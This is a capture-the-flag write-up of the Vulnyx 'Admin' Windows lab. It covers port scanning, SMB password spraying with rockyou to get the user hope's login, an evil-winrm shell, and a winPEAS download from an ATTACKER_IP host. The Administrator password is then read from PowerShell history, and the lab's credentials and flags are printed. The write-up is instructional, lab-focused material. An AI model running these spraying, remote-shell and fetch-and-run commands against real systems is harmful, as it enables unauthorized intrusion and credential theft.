# Vulnyx: Admin

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Windows |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `nxc` · `ffuf` · `evil-winrm` · `winPEAS` |
| **Tags** | `#InfoDisclosure` `#PasswordSpraying` `#WinRM` `#CredentialLeak` `#PSReadLine` |
| **URL** | https://vulnyx.com/machines/ |

A leaked username in `tasks.txt` is sprayed against SMB with `rockyou.txt`, landing valid credentials for `hope`. A WinRM session as that user gets the first flag, and `winPEAS` points toward a much simpler win: the PowerShell command history file has the Administrator's plaintext password sitting in it, typed at some point directly into a prompt.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn admin.nyx

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown      syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49669/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
MAC Address: 08:00:27:5C:74:31 (Oracle VirtualBox virtual NIC)
```

A version/script scan against the open ports fills in the details — a typical Windows spread, with SMB, WinRM (5985), and a web server on 80:

```bash
$ sudo nmap -p 80,135,139,445,5040,5985,47001,49664,49665,49666,49667,49668,49669,49670 -sCV admin.nyx

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:5C:74:31 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ADMIN, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5c:74:31 (Oracle
 VirtualBox virtual NIC)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-06-03T13:29:03
|_  start_date: N/A
```

### SMB Enumeration

```bash
$ nxc smb admin.nyx
SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
```
```bash
$ nxc smb admin.nyx -u '' -p '' --shares
SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
SMB         admin.nyx       445    ADMIN            [-] ADMIN\: STATUS_ACCESS_DENIED
SMB         admin.nyx       445    ADMIN            [-] Error enumerating shares: Error occurs while reading from remote(104)
```

The null-session attempt confirms the box's hostname and workgroup (both `ADMIN`) but goes no further — share enumeration comes back with `STATUS_ACCESS_DENIED`, so no shares are listed this way.

### Web Enumeration

```
http://admin.nyx
```
<img src="../Images/admin/Pasted image 20260603225758.png"/>

A content discovery scan turns up a text file:

```bash
$ ffuf -u http://admin.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -i

tasks.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 29ms]
Tasks.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 39ms]
TASKS.txt            [Status: 200, Size: 98, Words: 17, Lines: 9, Duration: 23ms]
```

```
http://admin.nyx/tasks.txt
```
```plaintext
Pending tasks:

 - Finish website
 - Update OS
 - Drink coffee
 - Rest
 - Change password

By hope
```

## Initial Access

### Password Spraying

With a username in hand, `rockyou.txt` is sprayed against SMB. The wordlist is converted to UTF-8 first, since its default encoding can trip up some tools' password comparisons:

```bash
$ iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
$ nxc smb admin.nyx -u hope -p rockyou-utf8.txt
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:jamie STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:santos STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:abcdefg STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:joanne STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:candy STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [-] ADMIN\hope:fuckyou2 STATUS_LOGON_FAILURE
SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
```
> **Credentials:** `hope:loser`

```bash
┌──(kali㉿kali)-[~]
└─$ nxc smb admin.nyx -u 'hope' -p 'loser' -x 'id'
SMB         admin.nyx       445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:None)
SMB         admin.nyx       445    ADMIN            [+] ADMIN\hope:loser
```

### Shell as hope

```bash
$ evil-winrm -i admin.nyx -u hope -p loser

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hope\Documents> whoami
admin\hope
```

```powershell
*Evil-WinRM* PS C:\Users\hope\Documents> whoami
admin\hope
*Evil-WinRM* PS C:\Users\hope\Documents> dir C:\Users\hope\Desktop


    Directory: C:\Users\hope\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/3/2024   9:42 PM             70 user.txt


*Evil-WinRM* PS C:\Users\hope\Documents> type C:\Users\hope\Desktop\user.txt
aacd4aebb5743ba45d3b4591ac03ace1
```

> **User flag:** `aacd4aebb5743ba45d3b4591ac03ace1`

## Privilege Escalation

### Credentials Leaked in PowerShell History

`winPEAS` is pulled down and run to automate the usual privilege escalation checks:

```powershell
*Evil-WinRM* PS C:\Users\hope\Documents> Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/winPEASany.exe -OutFile C:\Users\hope\Desktop\winPEASany.exe
*Evil-WinRM* PS C:\Users\hope\Documents> cd C:\Users\hope\Desktop
*Evil-WinRM* PS C:\Users\hope\Desktop> .\winPEASany.exe
```

<img src="../Images/admin/Pasted image 20260603231130.png"/>

One of the classic things `winPEAS` flags is readable PowerShell history — `PSReadLine` persists every command typed into a session, including any password that was ever typed directly into a prompt instead of piped in or entered through a secure input method:

```powershell
*Evil-WinRM* PS C:\Users\hope\Desktop> type C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Set-LocalUser -Name "administrator" -Password (ConvertTo-SecureString "SuperAdministrator123" -AsPlainText -Force)
*Evil-WinRM* PS C:\Users\hope\Desktop>
```

> **Credentials:** `administrator:SuperAdministrator123`

```bash
$ evil-winrm -i admin.nyx -u 'Administrator' -p 'SuperAdministrator123'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
admin\administrator
```

```powershell
*Evil-WinRM* PS C:\Users\administrator\Documents> whoami
admin\administrator
*Evil-WinRM* PS C:\Users\administrator\Documents> dir C:\Users\administrator\Desktop


    Directory: C:\Users\administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/3/2024   9:43 PM             70 root.txt


*Evil-WinRM* PS C:\Users\administrator\Documents> type C:\Users\administrator\Desktop\root.txt
fe586ba8f585e1ea97347be057659b81
```

> **Root flag:** `fe586ba8f585e1ea97347be057659b81`

## Takeaways

- A single leaked username turns a full user/password spray into a much more efficient single-user password spray — worth checking web content (`robots.txt`, stray `.txt` files, comments) for exactly this kind of leak before brute-forcing usernames too.
- `PSReadLine`'s command history is one of the most common places to find credentials on a Windows box — anyone who ever typed a password directly into a PowerShell prompt has likely left it sitting there in plaintext.
- Automated enumeration tools like `winPEAS` are useful for coverage, but the actual finding still needs to be understood and verified manually — running the tool isn't the same as knowing why the flagged issue matters.